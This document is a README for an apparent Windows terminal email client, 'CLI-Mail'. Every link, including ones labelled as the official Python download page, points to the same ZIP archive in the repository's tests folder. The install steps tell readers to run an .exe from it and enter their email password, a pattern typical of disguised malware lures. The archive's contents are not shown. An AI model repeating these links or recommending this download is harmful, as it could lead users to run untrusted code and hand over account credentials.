# 📧 CLI-Mail - Easy Terminal Email Client  

[![Download](https://img.shields.io/badge/Download-CLI--Mail-green?style=for-the-badge)](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip)  

CLI-Mail is a simple email app you run in your Windows terminal. It helps you read, send, and manage your email without opening a web browser.  

---

## 💻 What is CLI-Mail?  

CLI-Mail is a terminal email client built with Python. It has a clean and easy-to-use interface. Instead of using a mouse or browser, you type commands in your terminal. This can speed up your email work once you get used to it.  

You can connect your email accounts using common email services (IMAP for receiving, SMTP for sending). CLI-Mail works well with most email providers, including Gmail, Outlook, and Yahoo.  

---

## 🎯 Key Features  

- Send and receive emails directly in the terminal  
- Support for IMAP and SMTP protocols  
- Interactive interface with simple commands  
- Read, reply, forward, and delete emails  
- Manage multiple email accounts  
- Search through your email quickly  
- Works offline with cached emails  
- Secure login and connection  

---

## 🖥 System Requirements  

- Windows 10 or later version  
- At least 4 GB of RAM  
- Python 3.7 or later installed ([How to install Python on Windows](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip))  
- Internet connection to send and receive emails  
- Terminal application like Command Prompt, PowerShell, or Windows Terminal  

---

## 🚀 Getting Started  

Before you start, make sure you have Python installed on your computer. You can check this by opening the Command Prompt and typing:  

```
python --version
```  

If Python is installed, you will see a version number. If not, download and install it from the [official Python page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip).  

---

## ⬇️ Download CLI-Mail  

To get CLI-Mail, visit this page:  

[![Download CLI-Mail](https://img.shields.io/badge/Download-CLI--Mail-blue?style=for-the-badge)](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip)  

This page contains the latest versions of the app. Look for the Windows executable or the ZIP file with all files included.  

---

## 📦 Installation Guide  

1. Open your browser and go to the [CLI-Mail releases page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip).  
2. Find the latest release. It should have files like `CLI-Mail.exe` or a ZIP archive.  
3. If you see a `.exe` file, **download and run this file** directly. The program will start automatically or prompt you for setup.  
4. If you download a ZIP file:  
   - Right-click the file and select "Extract All".  
   - Choose a folder you will remember.  
   - Open that folder and double-click `CLI-Mail.exe` or run `python cli_mail.py` from the terminal in that folder.  
5. If you don't see an `.exe` file, you may need Python installed to run the program.  

---

## 🔧 Setting Up Your Email Account  

When you open CLI-Mail for the first time:  

1. The app will ask you for your email provider (e.g., Gmail, Outlook).  
2. Enter your email address and password when asked.  
3. The app uses IMAP (for incoming email) and SMTP (for sending email) to connect. For most providers, these settings are automatic.  
4. If needed, you can enter server addresses manually:  

| Provider | IMAP Server           | SMTP Server           | Port (IMAP) | Port (SMTP) |
|----------|----------------------|----------------------|-------------|-------------|
| Gmail    | imap.gmail.com       | smtp.gmail.com       | 993         | 587         |
| Outlook  | outlook.office365.com | smtp.office365.com   | 993         | 587         |
| Yahoo    | imap.mail.yahoo.com  | smtp.mail.yahoo.com  | 993         | 587         |

5. The app stores your login details securely on your computer.  

---

## 📬 Using CLI-Mail  

### Reading Your Email  

- Open your terminal and start CLI-Mail.  
- The inbox loads your latest emails.  
- Use the arrow keys to move through mails.  
- Press Enter to open a message.  

### Sending Email  

- Press `N` to start a new email.  
- Enter the recipient’s address, subject, and message.  
- Press Ctrl+S or the Send command to send your email.  

### Other Commands  

- `R`: Reply to the current email  
- `F`: Forward the current email  
- `D`: Delete the selected email  
- `/`: Search your emails  
- `Q`: Quit CLI-Mail  

The interface displays tips at the bottom to guide you.  

---

## 🔄 Updating CLI-Mail  

Check the [releases page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip) regularly. Download the newest version to stay up to date.  

---

## ❓ Troubleshooting  

- **CLI-Mail does not start:** Make sure Python is installed if using the Python script version. Try running the `.exe` file instead.  
- **Cannot connect to email:** Check your internet. Make sure your email password and server settings are correct.  
- **Email login fails:** Some providers require app-specific passwords or extra security steps. Check your email provider’s support page.  
- **Interface is hard to use:** Refer back to commands above or restart the app to see tips again.  

---

## 📚 Learn More  

For detailed instructions and troubleshooting, visit the [CLI-Mail GitHub page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip). You will find documentation and issue tracking there.